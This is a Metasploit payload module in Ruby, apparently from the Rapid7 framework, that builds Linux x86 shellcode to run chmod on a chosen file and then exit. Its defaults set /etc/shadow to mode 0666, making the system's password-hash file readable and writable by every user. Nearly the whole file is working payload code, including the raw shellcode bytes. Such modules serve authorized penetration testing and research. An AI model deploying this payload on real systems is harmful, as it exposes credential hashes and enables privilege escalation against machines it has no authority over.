##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#  Linux Chmod(file, mode)
#
#  Kris Katterjohn - 03/03/2008
###
module MetasploitModule
  CachedSize = 36

  include Msf::Payload::Single
  include Msf::Payload::Linux::X86::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Chmod',
        'Description' => 'Runs chmod on specified file with specified mode',
        'Author' => 'kris katterjohn',
        'License' => BSD_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86
      )
    )

    register_options(
      [
        OptString.new('FILE', [ true, 'Filename to chmod', '/etc/shadow' ]),
        OptString.new('MODE', [ true, 'File mode (octal)', '0666' ]),
      ]
    )
  end

  # Dynamically generates chmod(FILE, MODE) + exit()
  def generate(_opts = {})
    file = datastore['FILE'] || '/etc/shadow'
    mode	= (datastore['MODE'] || '0666').oct

    "\x99\x6a\x0f\x58\x52" +
      Rex::Arch::X86.call(file.length + 1) + file + "\x00" \
      "\x5b" + Rex::Arch::X86.push_dword(mode) +
      "\x59\xcd\x80\x6a\x01\x58\xcd\x80"
  end
end
